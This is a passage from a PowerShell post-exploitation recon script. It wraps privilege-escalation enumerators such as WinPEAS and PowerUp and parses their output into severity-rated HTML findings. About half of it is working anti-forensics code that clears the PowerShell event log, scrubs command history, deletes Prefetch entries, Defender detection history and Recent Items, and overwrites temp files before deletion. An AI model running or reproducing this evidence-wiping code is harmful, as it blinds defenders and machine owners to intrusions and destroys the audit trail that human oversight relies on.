        } else {
            Write-Host "  [INFO] " -ForegroundColor Cyan -NoNewline
            Write-Host "Keeping output directory ($($Script:ToolResults.Values | Where-Object { $_.Status -eq 'OK' } | Measure-Object | Select-Object -ExpandProperty Count) tools completed)"
        }
    } catch {
        Write-Host "  [WARN] " -ForegroundColor Yellow -NoNewline
        Write-Host "Could not remove partial output: $($_.Exception.Message)"
    }
}

function Invoke-CleanerMode {
    <#
    .SYNOPSIS
        Standalone cleaner mode. Removes ALL artifacts from any previous recon runs.
        Use when a previous run was interrupted and left files behind.
    #>
    Write-Host ""
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host "       CLEANER MODE - Removing All Traces" -ForegroundColor Red
    Write-Host "  ============================================" -ForegroundColor Red
    Write-Host ""

    $cleanResults = @{}

    # 1. Remove all ReconResults output directories
    try {
        $removed = 0
        if (Test-Path $OutputBaseDir -ErrorAction SilentlyContinue) {
            Get-ChildItem -Path $OutputBaseDir -Directory -Filter "Recon_*" -ErrorAction SilentlyContinue |
                ForEach-Object {
                    Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
                    $removed++
                }
            # Remove base dir if now empty
            if ((Get-ChildItem $OutputBaseDir -ErrorAction SilentlyContinue | Measure-Object).Count -eq 0) {
                Remove-Item $OutputBaseDir -Force -ErrorAction SilentlyContinue
            }
        }
        $cleanResults["Output directories"] = "Removed ($removed Recon_* folders)"
    } catch {
        $cleanResults["Output directories"] = "Failed: $($_.Exception.Message)"
    }

    # 2. Remove temp .cmd files (randomized bat tool names)
    try {
        $removed = 0
        Get-ChildItem -Path $env:TEMP -Filter "*.cmd" -ErrorAction SilentlyContinue |
            Where-Object { $_.Length -gt 0 } |
            ForEach-Object {
                Remove-SecureFile -FilePath $_.FullName | Out-Null
                $removed++
            }
        $cleanResults["Temp .cmd files"] = "Removed ($removed files)"
    } catch {
        $cleanResults["Temp .cmd files"] = "Failed: $($_.Exception.Message)"
    }

    # 3. Remove the script itself if it was downloaded to disk
    try {
        $scriptPath = $MyInvocation.ScriptName
        if ($scriptPath -and (Test-Path $scriptPath) -and $scriptPath -match '(Invoke-WindowsRecon|Recon)') {
            $cleanResults["Script file"] = "Found at $scriptPath (not auto-deleted - remove manually if needed)"
        } else {
            $cleanResults["Script file"] = "Not on disk (in-memory execution)"
        }
    } catch {
        $cleanResults["Script file"] = "Check skipped"
    }

    # 4. Clear Prefetch entries for all tool names + this script
    try {
        $prefetchDir = "$env:SystemRoot\Prefetch"
        $patterns = @("WINPEAS", "SEATBELT", "SHARPUP", "JAWS", "POWERUP", "POWERLESS", "PRIVESCCHECK", "INVOKE-WINDOWSRECON", "POWERSHELL")
        $removed = 0
        foreach ($pattern in $patterns) {
            Get-ChildItem -Path $prefetchDir -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object {
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                    $removed++
                }
        }
        $cleanResults["Prefetch entries"] = "Removed ($removed entries)"
    } catch {
        $cleanResults["Prefetch entries"] = "Failed: $($_.Exception.Message)"
    }

    # 5. Clear PowerShell history of recon references
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            $filterPatterns = @(
                "Invoke-WindowsRecon", "WinPEAS", "Seatbelt", "SharpUp", "JAWS",
                "PowerUp", "Powerless", "PrivescCheck", "ReconResults", "RECON_CLEAN",
                "recon-report", "DownloadString.*WindowsRecon"
            )
            $historyContent = Get-Content $historyPath -ErrorAction SilentlyContinue
            if ($historyContent) {
                $cleanedHistory = $historyContent | Where-Object {
                    $line = $_
                    $shouldRemove = $false
                    foreach ($pattern in $filterPatterns) {
                        if ($line -match [regex]::Escape($pattern)) { $shouldRemove = $true; break }
                    }
                    -not $shouldRemove
                }
                Set-Content -Path $historyPath -Value $cleanedHistory -Force
                $diff = $historyContent.Count - $cleanedHistory.Count
                $cleanResults["PS History"] = "Cleaned ($diff lines removed)"
            } else {
                $cleanResults["PS History"] = "Already clean"
            }
        } else {
            $cleanResults["PS History"] = "Not found"
        }
    } catch {
        $cleanResults["PS History"] = "Failed: $($_.Exception.Message)"
    }

    # 6. Clear PowerShell event logs
    try {
        wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
        $cleanResults["PS EventLog"] = "Cleared"
    } catch {
        $cleanResults["PS EventLog"] = "Failed: $($_.Exception.Message)"
    }

    # 7. Clear Defender detection/scan history
    try {
        $defenderPaths = @(
            "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory",
            "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Results\Quick",
            "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Results\Resource"
        )
        $removed = 0
        foreach ($dp in $defenderPaths) {
            if (Test-Path $dp) {
                Get-ChildItem -Path $dp -Recurse -ErrorAction SilentlyContinue |
                    ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue; $removed++ }
            }
        }
        $cleanResults["Defender History"] = "Removed ($removed items)"
    } catch {
        $cleanResults["Defender History"] = "Failed: $($_.Exception.Message)"
    }

    # 8. Clear Zone.Identifier ADS from temp
    try {
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue |
            ForEach-Object {
                Remove-Item "$($_.FullName):Zone.Identifier" -Force -ErrorAction SilentlyContinue
            }
        $cleanResults["Zone Identifiers"] = "Cleaned"
    } catch {
        $cleanResults["Zone Identifiers"] = "Failed: $($_.Exception.Message)"
    }

    # 9. Clear Recent Items referencing tools
    try {
        $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
        $toolPatterns = @("WinPEAS", "Seatbelt", "SharpUp", "JAWS", "PowerUp", "Powerless", "PrivescCheck", "ReconResults", "recon-report")
        $removed = 0
        foreach ($pattern in $toolPatterns) {
            Get-ChildItem -Path $recentPath -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue; $removed++ }
        }
        $cleanResults["Recent Items"] = "Removed ($removed items)"
    } catch {
        $cleanResults["Recent Items"] = "Failed: $($_.Exception.Message)"
    }

    # 10. Clear .NET assembly cache
    try {
        $cachePaths = @("$env:LOCALAPPDATA\assembly", "$env:SystemRoot\assembly\temp")
        foreach ($cp in $cachePaths) {
            if (Test-Path $cp) {
                Get-ChildItem -Path $cp -Recurse -ErrorAction SilentlyContinue |
                    ForEach-Object { Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue }
            }
        }
        $cleanResults["Assembly Cache"] = "Cleaned"
    } catch {
        $cleanResults["Assembly Cache"] = "Failed: $($_.Exception.Message)"
    }

    # Report
    Write-Host ""
    Write-Host "  CLEANER REPORT" -ForegroundColor White
    Write-Host "  ===============" -ForegroundColor DarkGray
    foreach ($item in $cleanResults.GetEnumerator()) {
        $icon = if ($item.Value -match "^(Removed|Cleaned|Cleared|Not found|Already clean|Not on disk)") { "[PASS]" } else { "[WARN]" }
        $color = if ($icon -eq "[PASS]") { "Green" } else { "Yellow" }
        Write-Host "  $icon " -ForegroundColor $color -NoNewline
        Write-Host "$($item.Key): $($item.Value)"
    }
    Write-Host ""
    Write-Host "  Cleaner mode complete. Machine should be clean." -ForegroundColor Green
    Write-Host ""
}

function Remove-SecureFile {
    param([string]$FilePath)
    if (Test-Path $FilePath) {
        try {
            # Overwrite with random data before deletion
            $fileSize = (Get-Item $FilePath).Length
            if ($fileSize -gt 0) {
                $randomBytes = New-Object byte[] ([math]::Min($fileSize, 10MB))
                (New-Object Random).NextBytes($randomBytes)
                [System.IO.File]::WriteAllBytes($FilePath, $randomBytes)
            }
            Remove-Item -Path $FilePath -Force -ErrorAction Stop
            Write-Log "Securely deleted: $FilePath"
            return $true
        } catch {
            Write-Log "Failed to delete: $FilePath - $($_.Exception.Message)" -Level "WARN"
            return $false
        }
    }
    return $true
}

function Remove-ReconTools {
    Write-Log "Cleaning up downloaded tools"

    foreach ($tempFile in $Script:TempFiles) {
        $result = Remove-SecureFile -FilePath $tempFile
        if (-not $result) {
            Write-Log "Could not remove temp file: $tempFile" -Level "WARN"
        }
    }

    # Clean up any stray temp files from this session
    $tempDir = $env:TEMP
    Get-ChildItem -Path $tempDir -Filter "*.cmd" -ErrorAction SilentlyContinue |
        Where-Object { $_.CreationTime -ge $Script:StartTime } |
        ForEach-Object {
            Remove-SecureFile -FilePath $_.FullName
        }
}

function Remove-ForensicTraces {
    Write-Log "Removing forensic traces"
    $cleanupResults = @{}

    # 1. Clear PowerShell command history for this session
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            $historyContent = Get-Content $historyPath -ErrorAction SilentlyContinue
            if ($historyContent) {
                # Remove lines referencing this script and tool names
                $filterPatterns = @("Invoke-WindowsRecon", "WinPEAS", "Seatbelt", "SharpUp", "JAWS", "PowerUp", "Powerless", "PrivescCheck", "ReconResults")
                $cleanedHistory = $historyContent | Where-Object {
                    $line = $_
                    $shouldRemove = $false
                    foreach ($pattern in $filterPatterns) {
                        if ($line -match [regex]::Escape($pattern)) {
                            $shouldRemove = $true
                            break
                        }
                    }
                    -not $shouldRemove
                }
                Set-Content -Path $historyPath -Value $cleanedHistory -Force -ErrorAction Stop
                $cleanupResults["PS History"] = "Cleaned"
            }
        }
        Write-Log "Cleaned PowerShell history"
    } catch {
        $cleanupResults["PS History"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean PS history: $($_.Exception.Message)" -Level "WARN"
    }

    # 2. Clear Prefetch entries
    try {
        $prefetchDir = "$env:SystemRoot\Prefetch"
        $toolPatterns = @("WINPEAS", "SEATBELT", "SHARPUP", "JAWS", "POWERUP", "POWERLESS", "PRIVESCCHECK")
        $removed = 0
        foreach ($pattern in $toolPatterns) {
            Get-ChildItem -Path $prefetchDir -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object {
                    Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
                    $removed++
                }
        }
        $cleanupResults["Prefetch"] = "Cleaned ($removed entries)"
        Write-Log "Cleaned Prefetch entries: $removed"
    } catch {
        $cleanupResults["Prefetch"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Prefetch: $($_.Exception.Message)" -Level "WARN"
    }

    # 3. Clear PowerShell event logs (Script Block Logging)
    try {
        $logName = "Microsoft-Windows-PowerShell/Operational"
        $sessionStartTime = $Script:StartTime
        if ($sessionStartTime) {
            # Clear recent PowerShell operational log entries
            wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
            $cleanupResults["PS EventLog"] = "Cleared"
            Write-Log "Cleared PowerShell operational event log"
        }
    } catch {
        $cleanupResults["PS EventLog"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clear PS event log: $($_.Exception.Message)" -Level "WARN"
    }

    # 4. Clear Defender detection history
    try {
        $defenderHistoryPath = "$env:ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory"
        if (Test-Path $defenderHistoryPath) {
            Get-ChildItem -Path $defenderHistoryPath -Recurse -ErrorAction SilentlyContinue |
                Where-Object { $_.LastWriteTime -ge $Script:StartTime } |
                ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
            $cleanupResults["Defender History"] = "Cleaned"
            Write-Log "Cleaned Defender detection history"
        } else {
            $cleanupResults["Defender History"] = "Not present"
        }
    } catch {
        $cleanupResults["Defender History"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Defender history: $($_.Exception.Message)" -Level "WARN"
    }

    # 5. Clear Zone.Identifier ADS from temp files
    try {
        Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue |
            Where-Object { $_.CreationTime -ge $Script:StartTime } |
            ForEach-Object {
                $adsPath = "$($_.FullName):Zone.Identifier"
                Remove-Item $adsPath -Force -ErrorAction SilentlyContinue
            }
        $cleanupResults["Zone Identifiers"] = "Cleaned"
        Write-Log "Cleaned Zone.Identifier ADS"
    } catch {
        $cleanupResults["Zone Identifiers"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Zone.Identifier ADS: $($_.Exception.Message)" -Level "WARN"
    }

    # 6. Clear recent items / jump lists that reference tools
    try {
        $recentPath = "$env:APPDATA\Microsoft\Windows\Recent"
        $toolPatterns = @("WinPEAS", "Seatbelt", "SharpUp", "JAWS", "PowerUp", "Powerless", "PrivescCheck", "ReconResults")
        foreach ($pattern in $toolPatterns) {
            Get-ChildItem -Path $recentPath -Filter "*$pattern*" -ErrorAction SilentlyContinue |
                ForEach-Object { Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue }
        }
        $cleanupResults["Recent Items"] = "Cleaned"
        Write-Log "Cleaned Recent Items"
    } catch {
        $cleanupResults["Recent Items"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean Recent Items: $($_.Exception.Message)" -Level "WARN"
    }

    # 7. Clear .NET assembly loading cache artifacts
    try {
        $assemblyCachePaths = @(
            "$env:LOCALAPPDATA\assembly",
            "$env:SystemRoot\assembly\temp"
        )
        foreach ($cachePath in $assemblyCachePaths) {
            if (Test-Path $cachePath) {
                Get-ChildItem -Path $cachePath -Recurse -ErrorAction SilentlyContinue |
                    Where-Object { $_.LastWriteTime -ge $Script:StartTime } |
                    ForEach-Object { Remove-Item $_.FullName -Force -Recurse -ErrorAction SilentlyContinue }
            }
        }
        $cleanupResults["Assembly Cache"] = "Cleaned"
        Write-Log "Cleaned .NET assembly cache"
    } catch {
        $cleanupResults["Assembly Cache"] = "Failed: $($_.Exception.Message)"
        Write-Log "Failed to clean assembly cache: $($_.Exception.Message)" -Level "WARN"
    }

    return $cleanupResults
}

function Show-CleanupReport {
    param([hashtable]$CleanupResults)

    Write-Host ""
    Write-Host "  CLEANUP REPORT" -ForegroundColor White
    Write-Host "  ===============" -ForegroundColor DarkGray

    if ($CleanupResults) {
        foreach ($item in $CleanupResults.GetEnumerator()) {
            $icon = if ($item.Value -match "^(Cleaned|Cleared|Not present)") { "[PASS]" } else { "[WARN]" }
            $color = if ($icon -eq "[PASS]") { "Green" } else { "Yellow" }
            Write-Host "  $icon " -ForegroundColor $color -NoNewline
            Write-Host "$($item.Key): $($item.Value)"
        }
    }

    Write-Host ""
}

# ============================================================================
# SECTION I-B: HTML REPORT GENERATION
# ============================================================================

function ConvertTo-HtmlSafe {
    param([string]$Text)
    if (-not $Text) { return "" }
    $cleaned = $Text -replace '\x1B\[[0-9;]*[a-zA-Z]', ''
    $cleaned = $cleaned -replace '[\x00-\x08\x0B\x0C\x0E-\x1F]', ''
    return [System.Net.WebUtility]::HtmlEncode($cleaned)
}

function Get-SeverityFromKeywords {
    param([string]$Text)
    if (-not $Text) { return "INFO" }

    $patterns = @(
        @{ Sev = "CRITICAL"; Rx = @(
            'password\s*[:=]', 'cleartext.*password', 'plaintext.*password',
            'autologon', 'cpassword', 'unattend\.xml.*password',
            'vnc.*password', 'snmp.*community', 'DefaultPassword',
            'token.*impersonat', 'SeImpersonatePrivilege',
            'SeAssignPrimaryTokenPrivilege', 'SeDebugPrivilege',
            'credential\s*manager', 'dpapi.*master.*key',
            'passwords?\s*found', 'credentials?\s*found',
            'registry.*password', 'cached.*credential'
        )},
        @{ Sev = "HIGH"; Rx = @(
            'writable', 'modifiable', 'unquoted.*service.*path',
            'service.*unquoted', 'dll\s*hijack', 'alwaysinstallelevated',
            'weak\s*permission', 'everyone.*(full|modify|write)',
            'builtin\\users.*(write|modify|full)',
            'authenticated\s*users.*(modify|full)',
            'service.*binary.*path.*space', 'autorun.*modifiable',
            'ms\d{2}-\d{3}', 'exploit', 'vulnerable\s*to',
            'abuse\s*function', 'can\s*be\s*exploited',
            'hijackable', 'dll.*not.*found'
        )},
        @{ Sev = "MEDIUM"; Rx = @(
            'missing.*patch', 'firewall.*disabled', 'no\s*antivirus',
            'outdated', 'defender.*disabled', 'uac.*disabled',
            'audit.*disabled', 'guest.*enabled', 'anonymous.*logon',
            'null.*session', 'smb.*signing.*disabled',
            'rdp.*no.*nla', 'world.*readable', 'weak.*config',
            'no.*updates', 'laps.*not'
        )},
        @{ Sev = "LOW"; Rx = @(
            'listening.*port', 'scheduled.*task', 'network.*interface',
            'installed.*software', 'local.*group.*member',
            'environment.*variable', 'mapped.*drive', 'share\s*name'
        )}
    )

    $lower = $Text.ToLower()
    foreach ($group in $patterns) {
        foreach ($rx in $group.Rx) {
            if ($lower -match $rx) {
                return $group.Sev
            }
        }
    }
    return "INFO"
}

# --- Per-Tool Parsers ---

function ConvertFrom-WinPEASOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $lines = $RawOutput -split "`n"
    $currentSection = "General"
    $blockLines = [System.Collections.ArrayList]::new()

    $flushBlock = {
        if ($blockLines.Count -gt 0) {
            $blockText = $blockLines -join "`n"
            $sev = Get-SeverityFromKeywords -Text $blockText
            $t = ($blockLines[0]).Trim()
            if ($t.Length -gt 120) { $t = $t.Substring(0, 120) + "..." }
            $findings.Add(@{
                Tool = "WinPEAS"; Category = $currentSection; Severity = $sev
                Title = $t; Details = $blockText; RawLines = [string[]]@($blockLines)
            }) | Out-Null
            $blockLines.Clear()
        }
    }

    for ($i = 0; $i -lt $lines.Count; $i++) {
        $line = $lines[$i].TrimEnd()

        if ($line -match '[\u2550\u2554\u2557\u255A\u255D\u2560\u2563\u2551]{3,}[\u2563\u2551]\s*(.+)') {
            & $flushBlock
            $currentSection = $Matches[1].Trim()
            continue
        }

        if ($line -match '^[\s\u2500-\u257F\u2580-\u259F\-=]{5,}$') {
            & $flushBlock
            if (($i + 1) -lt $lines.Count -and $lines[$i+1].Trim().Length -gt 2 -and $lines[$i+1] -notmatch '^[\s\u2500-\u257F\u2580-\u259F\-=]{5,}$') {
                $currentSection = $lines[$i+1].Trim()
            }
            continue
        }

        if ([string]::IsNullOrWhiteSpace($line)) {
            & $flushBlock
            continue
        }

        $blockLines.Add($line) | Out-Null
    }
    & $flushBlock

    if ($findings.Count -eq 0 -and $RawOutput.Trim().Length -gt 0) {
        $findings.Add(@{
            Tool = "WinPEAS"; Category = "Full Output"; Severity = Get-SeverityFromKeywords -Text $RawOutput
            Title = "WinPEAS Enumeration Results"; Details = $RawOutput.Trim()
            RawLines = [string[]]@($RawOutput -split "`n")
        }) | Out-Null
    }

    return ,$findings.ToArray()
}

function ConvertFrom-SeatbeltOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $sections = [regex]::Split($RawOutput, '(?m)^={4,}\s*(.+?)\s*={4,}\s*$')

    $categoryMap = @{
        'Credential|Vault|DPAPI|Token|Kerberos' = 'Credentials'
        'Service|Process' = 'Services & Processes'
        'Network|Firewall|DNS|ARP|TCP' = 'Network'
        'File|Directory|InterestingFile' = 'File System'
        'Registry|AutoRun' = 'Registry'
        'User|Group|Logon|Session|RDP' = 'Users & Groups'
    }

    for ($i = 1; $i -lt $sections.Count - 1; $i += 2) {
        $checkName = $sections[$i].Trim()
        $content = if (($i + 1) -lt $sections.Count) { $sections[$i + 1].Trim() } else { "" }
        if ([string]::IsNullOrWhiteSpace($content)) { continue }

        $category = "System Configuration"
        foreach ($pattern in $categoryMap.Keys) {
            if ($checkName -match $pattern) {
                $category = $categoryMap[$pattern]
                break
            }
        }

        $severity = Get-SeverityFromKeywords -Text "$checkName $content"

        $findings.Add(@{
            Tool = "Seatbelt"; Category = $category; Severity = $severity
            Title = $checkName; Details = $content
            RawLines = [string[]]@($content -split "`n")
        }) | Out-Null
    }

    if ($findings.Count -eq 0 -and $RawOutput.Trim().Length -gt 0) {
        $findings.Add(@{
            Tool = "Seatbelt"; Category = "Full Output"; Severity = Get-SeverityFromKeywords -Text $RawOutput
            Title = "Seatbelt Enumeration Results"; Details = $RawOutput.Trim()
            RawLines = [string[]]@($RawOutput -split "`n")
        }) | Out-Null
    }

    return ,$findings.ToArray()
}

function ConvertFrom-SharpUpOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $lines = $RawOutput -split "`n"
    $currentCheck = "General"
    $blockLines = [System.Collections.ArrayList]::new()
    $hasPositive = $false

    $flushSharpUp = {
        if ($blockLines.Count -gt 0) {
            $blockText = $blockLines -join "`n"
            $sev = if ($hasPositive) { "HIGH" } else { "INFO" }
            $kwSev = Get-SeverityFromKeywords -Text $blockText
            $sevOrder = @{ "CRITICAL" = 0; "HIGH" = 1; "MEDIUM" = 2; "LOW" = 3; "INFO" = 4 }
            if ($sevOrder[$kwSev] -lt $sevOrder[$sev]) { $sev = $kwSev }
            $findings.Add(@{
                Tool = "SharpUp"; Category = $currentCheck; Severity = $sev
                Title = $currentCheck; Details = $blockText
                RawLines = [string[]]@($blockLines)
            }) | Out-Null
            $blockLines.Clear()
        }
    }

    foreach ($line in $lines) {
        $trimmed = $line.TrimEnd()
        if ($trimmed -match '===\s*SharpUp[:\s]*(.+?)\s*===') {
            & $flushSharpUp
            $currentCheck = $Matches[1].Trim()
            $hasPositive = $false
            continue
        }
        if ($trimmed -match '^\[\+\]') { $hasPositive = $true }
        if (-not [string]::IsNullOrWhiteSpace($trimmed)) {
            $blockLines.Add($trimmed) | Out-Null
        }
    }
    & $flushSharpUp

    return ,$findings.ToArray()
}

function ConvertFrom-JAWSOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $sections = [regex]::Split($RawOutput, '(?m)^-{3,}\s*(.+?)\s*-{3,}\s*$')

    for ($i = 1; $i -lt $sections.Count - 1; $i += 2) {
        $sectionName = $sections[$i].Trim()
        $content = if (($i + 1) -lt $sections.Count) { $sections[$i + 1].Trim() } else { "" }
        if ([string]::IsNullOrWhiteSpace($content)) { continue }

        $severity = Get-SeverityFromKeywords -Text "$sectionName $content"

        $findings.Add(@{
            Tool = "JAWS"; Category = $sectionName; Severity = $severity
            Title = $sectionName; Details = $content
            RawLines = [string[]]@($content -split "`n")
        }) | Out-Null
    }

    if ($findings.Count -eq 0 -and $RawOutput.Trim().Length -gt 0) {
        $findings.Add(@{
            Tool = "JAWS"; Category = "Full Output"; Severity = Get-SeverityFromKeywords -Text $RawOutput
            Title = "JAWS Enumeration Results"; Details = $RawOutput.Trim()
            RawLines = [string[]]@($RawOutput -split "`n")
        }) | Out-Null
    }

    return ,$findings.ToArray()
}

function ConvertFrom-PowerUpOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $lines = $RawOutput -split "`n"
    $currentCheck = "General"
    $blockLines = [System.Collections.ArrayList]::new()
    $hasPositive = $false

    $flushPowerUp = {
        if ($blockLines.Count -gt 0) {
            $blockText = $blockLines -join "`n"
            $sev = if ($hasPositive) { "HIGH" } else { "INFO" }
            $kwSev = Get-SeverityFromKeywords -Text $blockText
            $sevOrder = @{ "CRITICAL" = 0; "HIGH" = 1; "MEDIUM" = 2; "LOW" = 3; "INFO" = 4 }
            if ($sevOrder[$kwSev] -lt $sevOrder[$sev]) { $sev = $kwSev }
            $findings.Add(@{
                Tool = "PowerUp"; Category = $currentCheck; Severity = $sev
                Title = $currentCheck; Details = $blockText
                RawLines = [string[]]@($blockLines)
            }) | Out-Null
            $blockLines.Clear()
        }
    }

    foreach ($line in $lines) {
        $trimmed = $line.TrimEnd()
        if ($trimmed -match '^\[\*\]\s*Checking\s+(.+)') {
            & $flushPowerUp
            $currentCheck = $Matches[1].Trim().TrimEnd('.')
            $hasPositive = $false
            continue
        }
        if ($trimmed -match '^\[\+\]') { $hasPositive = $true }
        if (-not [string]::IsNullOrWhiteSpace($trimmed)) {
            $blockLines.Add($trimmed) | Out-Null
        }
    }
    & $flushPowerUp

    return ,$findings.ToArray()
}

function ConvertFrom-PowerlessOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $sections = [regex]::Split($RawOutput, '(?m)^-{4,}\s*(.+?)\s*-{4,}\s*$')

    for ($i = 1; $i -lt $sections.Count - 1; $i += 2) {
        $sectionName = $sections[$i].Trim()
        $content = if (($i + 1) -lt $sections.Count) { $sections[$i + 1].Trim() } else { "" }
        if ([string]::IsNullOrWhiteSpace($content)) { continue }

        $severity = Get-SeverityFromKeywords -Text "$sectionName $content"

        $findings.Add(@{
            Tool = "Powerless"; Category = $sectionName; Severity = $severity
            Title = $sectionName; Details = $content
            RawLines = [string[]]@($content -split "`n")
        }) | Out-Null
    }

    if ($findings.Count -eq 0 -and $RawOutput.Trim().Length -gt 0) {
        $findings.Add(@{
            Tool = "Powerless"; Category = "Full Output"; Severity = Get-SeverityFromKeywords -Text $RawOutput
            Title = "Powerless Enumeration Results"; Details = $RawOutput.Trim()
            RawLines = [string[]]@($RawOutput -split "`n")
        }) | Out-Null
    }

    return ,$findings.ToArray()
}

function ConvertFrom-PrivescCheckOutput {
    param([string]$RawOutput)
    $findings = [System.Collections.ArrayList]::new()
    if (-not $RawOutput) { return ,@() }

    $blocks = $RawOutput -split '(?m)^\s*$' | Where-Object { $_.Trim().Length -gt 0 }

    foreach ($block in $blocks) {
        $blockTrimmed = $block.Trim()

        $nameMatch = [regex]::Match($blockTrimmed, '(?m)^.*?Name\s*:\s*(.+)$')
        $sevMatch = [regex]::Match($blockTrimmed, '(?mi)^.*?Severity\s*:\s*(.+)$')
        $descMatch = [regex]::Match($blockTrimmed, '(?m)^.*?Description\s*:\s*(.+)$')
        $resultMatch = [regex]::Match($blockTrimmed, '(?mi)^.*?Result\s*:\s*(.+)$')

        if ($nameMatch.Success) {
            $checkName = $nameMatch.Groups[1].Value.Trim()

            $severity = "INFO"
            if ($sevMatch.Success) {
                $nativeSev = $sevMatch.Groups[1].Value.Trim()
                $severity = switch -Regex ($nativeSev) {
                    '(?i)high'   { "HIGH" }
                    '(?i)medium' { "MEDIUM" }
                    '(?i)low'    { "LOW" }
                    default      { "INFO" }
                }
            }

            if ($severity -eq "HIGH") {
                $kwSev = Get-SeverityFromKeywords -Text $blockTrimmed
                if ($kwSev -eq "CRITICAL") { $severity = "CRITICAL" }
            }

            $result = if ($resultMatch.Success) { $resultMatch.Groups[1].Value.Trim() } else { "" }
            $title = $checkName
            if ($result -and $result -ne "N/A") { $title += " - $result" }
            if ($title.Length -gt 120) { $title = $title.Substring(0, 120) + "..." }

            $findings.Add(@{
                Tool = "PrivescCheck"; Category = $checkName; Severity = $severity
                Title = $title; Details = $blockTrimmed
                RawLines = [string[]]@($blockTrimmed -split "`n")
            }) | Out-Null
        } elseif ($blockTrimmed.Length -gt 20) {
            $severity = Get-SeverityFromKeywords -Text $blockTrimmed
            $firstLine = ($blockTrimmed -split "`n")[0].Trim()
            if ($firstLine.Length -gt 120) { $firstLine = $firstLine.Substring(0, 120) + "..." }
            $findings.Add(@{
                Tool = "PrivescCheck"; Category = "General"; Severity = $severity
                Title = $firstLine; Details = $blockTrimmed
                RawLines = [string[]]@($blockTrimmed -split "`n")
            }) | Out-Null
        }
    }

    return ,$findings.ToArray()
}

# --- Dispatcher ---

function ConvertFrom-ToolOutput {
    param([string]$ToolName, [string]$RawOutput)
    if (-not $RawOutput) { return @() }

    $findings = switch ($ToolName) {
        "WinPEAS"       { ConvertFrom-WinPEASOutput -RawOutput $RawOutput }
        "Seatbelt"      { ConvertFrom-SeatbeltOutput -RawOutput $RawOutput }
        "SharpUp"       { ConvertFrom-SharpUpOutput -RawOutput $RawOutput }
        "JAWS"          { ConvertFrom-JAWSOutput -RawOutput $RawOutput }
        "PowerUp"       { ConvertFrom-PowerUpOutput -RawOutput $RawOutput }
        "Powerless"     { ConvertFrom-PowerlessOutput -RawOutput $RawOutput }
        "PrivescCheck"  { ConvertFrom-PrivescCheckOutput -RawOutput $RawOutput }
        default {
            ,@(@{
                Tool = $ToolName; Category = "Uncategorized"; Severity = "INFO"
                Title = "$ToolName output"; Details = $RawOutput
                RawLines = [string[]]@($RawOutput -split "`n")
            })
        }
    }

    if ($null -eq $findings) { return @() }
    return $findings
}

# --- Line Coverage Safety Net ---

function Test-FindingLineCoverage {
    param([string]$RawOutput, [array]$Findings)

    $allLines = $RawOutput -split "`n"
    $parsedLineSet = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase
    )

    foreach ($finding in $Findings) {
        if ($finding.RawLines) {
            foreach ($rl in $finding.RawLines) {
                if ($rl) { $parsedLineSet.Add($rl.TrimEnd()) | Out-Null }
            }
        }
    }

    $unparsed = [System.Collections.ArrayList]::new()
    foreach ($line in $allLines) {
        $trimmed = $line.TrimEnd()
        if ([string]::IsNullOrWhiteSpace($trimmed)) { continue }
        if ($trimmed -match '^[\s\u2500-\u257F\u2580-\u259F\-=\+\|\*]{4,}$') { continue }
        if (-not $parsedLineSet.Contains($trimmed)) {
            $unparsed.Add($trimmed) | Out-Null
        }
    }

    return ,$unparsed.ToArray()
}

# --- Cross-Tool Duplicate Detection ---

function Find-DuplicateFindings {
    param([array]$AllFindings)

    $dupeKeys = @(
        @{ Key = "unquoted_svc_path"; Patterns = @('unquoted.*service', 'service.*unquoted.*path') },
        @{ Key = "modifiable_svc"; Patterns = @('modifiable.*service', 'writable.*service', 'service.*permission') },
        @{ Key = "always_install"; Patterns = @('alwaysinstallelevated') },
        @{ Key = "dll_hijack"; Patterns = @('dll.*hijack', 'missing.*dll', 'hijackable.*path') },
        @{ Key = "autorun"; Patterns = @('autorun', 'auto.*run.*modifiable') },
